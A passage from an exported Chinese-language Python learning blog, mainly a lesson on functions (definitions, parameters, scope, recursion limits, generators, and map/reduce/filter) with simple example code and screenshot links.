class="string">&#x27;Ping&#x27;</span>,)).start()</span><br><span class="line">    p2 = threading.Thread(target=sub_task, args=(<span class="string">&#x27;Pong&#x27;</span>,)).start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()  </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习-ch5 函数和模块</title>
    <url>/2023/04/10/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0-ch5%20%E5%87%BD%E6%95%B0%E5%92%8C%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="5-1函数的定义与调用"><a href="#5-1函数的定义与调用" class="headerlink" title="5.1函数的定义与调用"></a>5.1函数的定义与调用</h1><blockquote>
<p>本章思维导图</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671766.png"></p>
<h2 id="5-1-1-函数的定义与说明文档"><a href="#5-1-1-函数的定义与说明文档" class="headerlink" title="5.1.1 函数的定义与说明文档"></a>5.1.1 函数的定义与说明文档</h2><blockquote>
<p>函数的定义：</p>
</blockquote>
<p>函数是一段具有特定功能的、可复用的语句组，是一种功能抽象。</p>
<p><strong>定义格式</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> &lt;函数名&gt;(参数列表)：</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &lt;返回值列表&gt;</span><br></pre></td></tr></table></figure>

<p>代码示例：（阶乘）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fac</span>(<span class="params">n</span>):  <span class="comment"># 这里函数的参数为形参，不需要给出参数的类型。</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">        result *= i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="built_in">print</span>(fac(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<p>注：在python的<strong>math模块</strong>已经有专门的**阶乘函数factorial()**。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671767.png"></p>
<hr>
<blockquote>
<p>函数的调用：</p>
</blockquote>
<ul>
<li>使用函数名进行已有函数的调用</li>
<li>函数调用时传入实参，带入运算</li>
<li>根据return 决定是否返回结果</li>
</ul>
<hr>
<blockquote>
<p>说明文档：</p>
</blockquote>
<p>在函数声明和函数体之间使用<strong>三引号</strong>写入说明文档，使用<code>help()</code>进行查看。</p>
<p><strong>示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fac</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    此函数用于求解阶乘</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">        result *= i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>(fac)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671664.png"></p>
<p>注：也可以使用函数的<strong>doc属性</strong>查看帮助文档。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671666.png"></p>
<h2 id="5-1-2-函数的返回值"><a href="#5-1-2-函数的返回值" class="headerlink" title="5.1.2 函数的返回值"></a>5.1.2 函数的返回值</h2><blockquote>
<p>函数的返回值概述：</p>
</blockquote>
<ul>
<li>函数不带return，则无返回值，相当于<strong>返回None</strong>。</li>
<li>程序有<strong>多个返回值</strong>，可以封装为列表进行返回，也可以直接返回。<strong>直接返回时以元组的形式</strong>。</li>
</ul>
<p><strong>代码示例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671723.png"><br><strong>注</strong>：使用<strong>序列解包</strong>依次赋值亦可。</p>
<h2 id="5-1-4-函数的嵌套"><a href="#5-1-4-函数的嵌套" class="headerlink" title="5.1.4 函数的嵌套"></a>5.1.4 函数的嵌套</h2><blockquote>
<p>函数允许<strong>嵌套定义</strong>函数；函数调用自己为<strong>递归</strong>。</p>
</blockquote>
<p><strong>代码示例：（二分查找）</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">binary_search</span>(<span class="params">target,data,low,high</span>):</span><br><span class="line">    <span class="keyword">if</span> low&gt;high:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> target == data[mid]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> target &gt; data[mid]:</span><br><span class="line">            <span class="keyword">return</span> binary_search(target,data,mid+<span class="number">1</span>,high)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> binary_search(target,data,low,mid-<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">data = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">binary_search(<span class="number">7</span>,data,<span class="number">0</span>,<span class="built_in">len</span>(data)-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>注意事项：递归的次数限制</strong></p>
<ul>
<li>python设置了递归的最大次数以防止无限递归。</li>
<li>使用<code> sys 模块</code>进行这个次数的查看与设置。（见代码）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用getrecursionlimit()查看最大次数</span></span><br><span class="line"><span class="built_in">print</span>(sys.getrecursionlimit())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用setrecursionlimit(x)设置最大次数</span></span><br><span class="line">sys.setrecursionlimit(<span class="number">5000</span>)</span><br><span class="line"><span class="built_in">print</span>(sys.getrecursionlimit())</span><br></pre></td></tr></table></figure>
<p><strong>结果演示</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671725.png"></p>
<h2 id="5-1-5-函数执行的起点"><a href="#5-1-5-函数执行的起点" class="headerlink" title="5.1.5 函数执行的起点"></a>5.1.5 函数执行的起点</h2><blockquote>
<p>脚本可以独立运行：</p>
<blockquote>
<p>C语言程序的起点时main()函数，而python的脚本程序可以不写main。<br>每一个python 在运行时，都有一个<code> __name__</code> 属性.</p>
</blockquote>
</blockquote>
<p><code>__name__</code>的默认值是<code>__ main__</code><br>这个属性的作用就是<strong>判断一个脚本程序是直接运行还是作为模块进行调用</strong>。<br>如果不希望直接运行，可以加上以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if __ name __ == &quot;__ main__ &quot;:</span><br><span class="line">	print(&quot;作为模块进行调用&quot;)</span><br></pre></td></tr></table></figure>


<h1 id="5-2-函数的参数"><a href="#5-2-函数的参数" class="headerlink" title="5.2 函数的参数"></a>5.2 函数的参数</h1><blockquote>
<p>本小节思维导图：</p>
</blockquote>
<h2 id="5-2-1-位置参数"><a href="#5-2-1-位置参数" class="headerlink" title="5.2.1 位置参数"></a>5.2.1 位置参数</h2><blockquote>
<p>调用函数时<strong>实参和形参</strong>的数目和顺序必须严格一致。</p>
</blockquote>
<p><strong>例如下例</strong>（二分查找）：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671726.png"><br>当实参与形参<strong>数目不一致</strong>时会报错。</p>
<h2 id="5-2-2-默认值参数"><a href="#5-2-2-默认值参数" class="headerlink" title="5.2.2 默认值参数"></a>5.2.2 默认值参数</h2><blockquote>
<p>如果大部分参数是某个值，可以设置为<strong>默认值参数</strong>，简化函数的调用。 </p>
</blockquote>
<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printinfo</span>(<span class="params">name,age=<span class="number">18</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你的名字是：&quot;</span>,name)</span><br><span class="line">    </span><br><span class="line">    age += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;明年你的年龄是：&quot;</span>,age)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用函数时没有输出某个实参，则会使用默认值参数   </span></span><br><span class="line">printinfo(<span class="string">&#x27;xyq&#x27;</span>)</span><br><span class="line"><span class="comment"># 调用函数时输入了参数，则不会使用默认参数</span></span><br><span class="line">printinfo(<span class="string">&#x27;xy1&#x27;</span>,<span class="number">21</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671764.png"></p>
<p><strong>注意事项</strong>：</p>
<ol>
<li>默认值参数在定义时必须放在<strong>正常参数的后面</strong>。即默认值参数右边不要有非默认值参数。</li>
<li>非默认值参数必须<strong>传入实参</strong>。</li>
<li>在调用时<strong>不可以对实参进行赋值</strong>。如：<code>printinfo(age = 19)</code></li>
<li>默认参数必须是<strong>不可变对象</strong>，如：int,str,tuple等。如果是list,dict会发生数据错误。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671665.png"></li>
</ol>
<h1 id="5-2-3-可变参数"><a href="#5-2-3-可变参数" class="headerlink" title="5.2.3 可变参数"></a>5.2.3 可变参数</h1><blockquote>
<p>对于参数不确定的情况，可以使用可变参数的方式。</p>
</blockquote>
<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a,b,*c</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">            a += i</span><br><span class="line">    <span class="keyword">elif</span> b == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">            a -= i</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">l1 = f(<span class="number">2</span>,<span class="string">&#x27;-&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">l2 = f(<span class="number">2</span>,<span class="string">&#x27;+&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(l1,l2)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671768.png"></p>
<p>使用<code>*c</code> 的方式定义<strong>可变参数</strong>，在调用时，会把传入的实参<strong>封装为一个元组</strong>。可以使用<strong>for in 循环</strong>进行使用。</p>
<h2 id="5-2-4-关键字参数"><a href="#5-2-4-关键字参数" class="headerlink" title="5.2.4 关键字参数"></a>5.2.4 关键字参数</h2><blockquote>
<p><code>**kw</code>接收参数并将参数<strong>封装为字典</strong>。</p>
</blockquote>
<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">student</span>(<span class="params">name,age,**kw</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;name:&quot;</span>,name,<span class="string">&#x27;age&#x27;</span>,age,<span class="string">&#x27;other&#x27;</span>,kw)</span><br><span class="line">    </span><br><span class="line">student(<span class="string">&#x27;xyq&#x27;</span>,<span class="number">19</span>,city=<span class="string">&#x27;tz&#x27;</span>,baba=<span class="string">&#x27;xhp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以使用先定义字典再传入参数</span></span><br><span class="line">other = &#123;<span class="string">&#x27;city&#x27;</span>:<span class="string">&#x27;tz&#x27;</span>,<span class="string">&#x27;baba&#x27;</span>:<span class="string">&#x27;xhp&#x27;</span>&#125;</span><br><span class="line">student(<span class="string">&#x27;xyq&#x27;</span>,<span class="number">19</span>,**other</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671784.png"></p>
<h2 id="5-2-5-命名关键字"><a href="#5-2-5-命名关键字" class="headerlink" title="5.2.5 命名关键字"></a>5.2.5 命名关键字</h2><blockquote>
<p>承接上节，当我们需要<strong>给定关键字参数具体名字</strong>的时候，可以使用：<code>def f(name,age,* ，city,baba)</code></p>
</blockquote>
<p><strong>代码实例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671798.png"> </p>
<p><strong>注</strong>：关键字参数更多的是用于对<strong>内置函数或者模块函数</strong>的功能进行调整。</p>
<h2 id="5-2-6-综合实例：计算月份平均天数"><a href="#5-2-6-综合实例：计算月份平均天数" class="headerlink" title="5.2.6 综合实例：计算月份平均天数"></a>5.2.6 综合实例：计算月份平均天数</h2><ol>
<li>使用位置参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">month_aver</span>(<span class="params">start,end</span>):</span><br><span class="line">    month = [<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start-<span class="number">1</span>,end):</span><br><span class="line">        <span class="built_in">sum</span> += month[i]</span><br><span class="line">    aver = <span class="built_in">sum</span>/(end-start+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> aver</span><br><span class="line">	</span><br><span class="line"><span class="built_in">print</span>(month_aver(<span class="number">1</span>,<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<hr>
<ol start="2">
<li>使用可变参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">month_aver</span>(<span class="params">*avge</span>):</span><br><span class="line">    month = [<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> avge:</span><br><span class="line">        <span class="built_in">sum</span> += month[i-<span class="number">1</span>]</span><br><span class="line">    aver = <span class="built_in">sum</span>/<span class="built_in">len</span>(avge)</span><br><span class="line">    <span class="keyword">return</span> aver</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(month_aver(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：使用<code>*avge</code>作为可变参数，使用是会把传入的参数<strong>封装为元组</strong>。</p>
<hr>
<ol start="3">
<li>使用默认参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">month_aver</span>(<span class="params">start,end=<span class="number">12</span></span>):</span><br><span class="line">    month = [<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start-<span class="number">1</span>,end):</span><br><span class="line">        <span class="built_in">sum</span> += month[i]</span><br><span class="line">    aver = <span class="built_in">sum</span>/(end-start+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> aver</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(month_aver(<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注</strong>：在函数<strong>定义时</strong>使用默认参数指定end的值。</p>
<hr>
<ol start="4">
<li>使用关键字参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">month_aver</span>(<span class="params">start,*,end</span>):</span><br><span class="line">    month = [<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start-<span class="number">1</span>,end):</span><br><span class="line">        <span class="built_in">sum</span> += month[i]</span><br><span class="line">    aver = <span class="built_in">sum</span>/(end-start+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> aver</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(month_aver(<span class="number">1</span>,end = <span class="number">12</span>))</span><br></pre></td></tr></table></figure>
<p><strong>注</strong>：使用<code>*</code>隔开关键字参数。在<strong>调用时</strong>指定该参数的值。</p>
<h2 id="5-2-7-函数参数的传递方式"><a href="#5-2-7-函数参数的传递方式" class="headerlink" title="5.2.7 函数参数的传递方式"></a>5.2.7 函数参数的传递方式</h2><blockquote>
<p>在python里，参数的传递方式采用<strong>值传递</strong>的方式。</p>
</blockquote>
<p><strong>先来看一个例子</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671802.png"></p>
<p>出现上述现象的原因在于：进行参数传递是只是<strong>传递的值</strong>，而<strong>不是内存地址</strong>。所以在函数里改变此变量不会对主函数有影响。</p>
<hr>
<p><strong>再来看一个例子</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671813.png"></p>
<p>这里发现在函数里改变列表的值也会对主函数有影响。这是因为对于<code>列表、字典</code>这些<strong>可变序列</strong>在传递时传入的是<strong>内存地址</strong>。</p>
<h1 id="5-3-lambda表达式"><a href="#5-3-lambda表达式" class="headerlink" title="5.3 lambda表达式"></a>5.3 lambda表达式</h1><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671814.png"><br>是一种匿名函数，可以把一些简单的函数利用这种简化方法进行实现。</p>
<h1 id="5-4-变量的作用域"><a href="#5-4-变量的作用域" class="headerlink" title="5.4 变量的作用域"></a>5.4 变量的作用域</h1><blockquote>
<p>概述：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671804.png"></p>
<h2 id="5-4-1-全局变量"><a href="#5-4-1-全局变量" class="headerlink" title="5.4.1 全局变量"></a>5.4.1 全局变量</h2><blockquote>
<p>在函数之外定义的变量，在程序执行全过程有效。</p>
</blockquote>
<p>先看下面这个例子：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671805.png"></p>
<p>在<strong>1函里</strong>可以打印外部变量n的值，但是在<strong>2函数</strong>却报错了。原因在于一旦<strong>在函数里</strong>对某个变量进行操作，就会认为这个变量是<strong>局部变量</strong>，需要先定义。</p>
<h2 id="5-4-2-局部变量"><a href="#5-4-2-局部变量" class="headerlink" title="5.4.2 局部变量"></a>5.4.2 局部变量</h2><blockquote>
<p>在函数里定义，仅在函数内部起作用。函数退出时自动销毁。</p>
</blockquote>
<p><strong>看个例子</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671806.png"></p>
<p>无法在函数之外获取局部变量。</p>
<h2 id="5-4-3-二者之间的关系"><a href="#5-4-3-二者之间的关系" class="headerlink" title="5.4.3 二者之间的关系"></a>5.4.3 二者之间的关系</h2><p>一般情况下，局部变量和全局变量没有关系，就算他们的名称相同也不会相互影响。</p>
<blockquote>
<p>global关键字</p>
</blockquote>
<p>在函数内使用 <code>global a </code>即可声明a为<strong>全局变量</strong>，在函数外也可以进行输出。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671808.png"></p>
<p>在函数内声明了全局变量，这个变量与外部先定义的变量就会指向同一个存储空间。</p>
<blockquote>
<p>globals()和locals(）访问全局变量和局部变量。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671809.png"></p>
<h1 id="5-5-函数的高级特性"><a href="#5-5-函数的高级特性" class="headerlink" title="5.5 函数的高级特性"></a>5.5 函数的高级特性</h1><blockquote>
<p>先放一个思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752671992.png"></p>
<h2 id="5-5-1-函数生成器"><a href="#5-5-1-函数生成器" class="headerlink" title="5.5.1 函数生成器"></a>5.5.1 函数生成器</h2><blockquote>
<p>定义引入</p>
</blockquote>
<p><strong>生成器</strong>：一种<strong>惰性运算</strong>，需要一个元素时，才会产生对应元素，节省了存储空间。</p>
<blockquote>
<p>先来看一个例子：斐波那契数列</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">m</span>):</span><br><span class="line">    n,a,b = <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n  &lt; m:</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">        a,b = b,a+b</span><br><span class="line">        n+=<span class="number">1</span></span><br><span class="line">fib(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<p>上例<strong>运行截图</strong>如下：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672022.png"></p>
<hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">m</span>):</span><br><span class="line">    n,a,b = <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n  &lt; m:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b = b,a+b</span><br><span class="line">        n+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">g = fib(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(g.__next__(),end = <span class="string">&quot;\t&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>上例<strong>运行截图</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672023.png"></p>
<p><strong>对比分析</strong>：<br>上面两个例子的运行结果一样，但是具体的执行流程是不同的。前者是<strong>直接调用函数</strong>，而后执行完成；后者是<strong>函数生成器</strong>，根据迭代次数动态的进行调用。</p>
<hr>
<blockquote>
<p>再来看一个例子：生成器的执行流程</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672026.png"></p>
<p><strong>流程如下</strong>：<br>指定g为一个生成器 —&gt; 进入for 循环 开始第一次循环—&gt;执行fib 函数并运行到yield b 返回其值—&gt; 输出其值而后执行打印语句—&gt; 第二次循环，会从yield b语句下面的语句开始执行，直到再次返回yield b返回。</p>
<p><strong>注意点</strong>：<br>1、使用<code> yield 关键字</code>定义一个函数生成器。<br>2、生成器是<strong>惰性运算</strong>，需要获取其值时才会进行函数的调用与执行。<br>3、在函数生成器里，函数运行到yield后进会返回，下一次调用会<strong>接上次进行</strong>。</p>
<h2 id="5-5-2-高阶函数"><a href="#5-5-2-高阶函数" class="headerlink" title="5.5.2 高阶函数"></a>5.5.2 高阶函数</h2><blockquote>
<p>定义引入：</p>
</blockquote>
<p><strong>高阶函数</strong>：<em>参数</em>也可以是<em>函数</em>。</p>
<blockquote>
<p>第一个高阶函数:map()</p>
<blockquote>
<p>理解：映射</p>
</blockquote>
</blockquote>
<p><strong>函数介绍</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672027.png"><br>简单理解就是将可迭代对象里的元素<strong>依次作用于</strong>函数，返回一个map对象（惰性运算）</p>
<hr>
<p><strong>看一个例子</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(x,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">map</span>(fun,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(l.__next__())</span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672041.png"></p>
<p>可见，map函数就是将第二个参数里的值依次拿出参与参数1的运算并返回结果。<br><strong>注</strong>：前面我们学习了lambda表达式，可以将一个简单函数简写，所以上例也可以这样写：<br><code>l = list(map(lambda x:x**2,[1,2,3,4]))</code></p>
<hr>
<p>map把<strong>运算规则</strong>进行了抽象，例如：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672055.png"><br>通过str将列表里的元素转换为字符形式。</p>
<hr>
<blockquote>
<p>第二个高阶函数：reduce</p>
<blockquote>
<p>理解：化简</p>
</blockquote>
</blockquote>
<p><strong>函数介绍</strong>：<br><code>1reduce(func,iterable)</code></p>
<ul>
<li>两个参数：func为函数、iterable为可迭代对象</li>
<li>作用：对序列中的第1、2个元素进行操作，得到的结果再与第三数据用func函数运算，最后得到一个结果。</li>
</ul>
<p><strong>直接看例子</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672058.png"><br><strong>注</strong>：<br>1、reduce函数不是内置函数，需要进行functools模块的导入<br>2、此函数不需要返回值，而是直接输出结果。</p>
<hr>
<blockquote>
<p>第三个高阶函数：filter()</p>
<blockquote>
<p>理解：过滤</p>
</blockquote>
</blockquote>
<p><strong>函数介绍</strong>：<br><code>filter(func or none,iterable) ---&gt; filter object</code></p>
<ul>
<li>两个参数：参数func为函数，iterable为可迭代对象</li>
<li>作用：函数依次作用于每一个元素，然后根据返回值是True还是False决定是否保留该元素。</li>
<li>返回值：filter 对象（属于惰性计算）</li>
</ul>
<p><strong>看一个例子</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">k  = <span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x%<span class="number">2</span>==<span class="number">0</span>,L1)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;\t&quot;</span>)</span><br></pre></td></tr></table></figure>
